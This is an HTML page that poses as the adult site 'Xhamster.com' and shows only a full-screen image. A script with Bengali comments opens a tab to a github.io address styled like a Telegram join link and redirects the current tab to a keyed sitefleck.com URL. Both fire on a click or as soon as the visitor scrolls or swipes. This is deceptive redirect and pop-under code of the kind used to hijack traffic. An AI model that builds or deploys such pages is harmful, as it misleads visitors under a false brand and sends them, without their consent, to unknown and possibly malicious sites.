<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xhamster.com</title>

<style>
body{
    margin:0;
    background:#000;
}

img{
    width:100%;
    height:100%;
    object-fit:cover;
}
</style>

<body>

<img src="1st.jpg" onclick="openLinks()">

    <script>
let opened = false;

function openLinks() {

    if (opened) return;
    opened = true;

    // আগে নতুন ট্যাব ওপেন হবে
    const newTab = window.open(
        "https://tme-join.github.io/dgngbf/",
        "_blank"
    );

    // তারপর বর্তমান ট্যাব রিডাইরেক্ট
    setTimeout(() => {
        window.location.href =
            "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868";
    }, 100);

}

// স্ক্রল শুরু হলেই ট্রিগার
window.addEventListener(
    "wheel",
    openLinks,
    { passive: true }
);

window.addEventListener(
    "touchmove",
    openLinks,
    { passive: true }
);
</script>

</body>
</html>
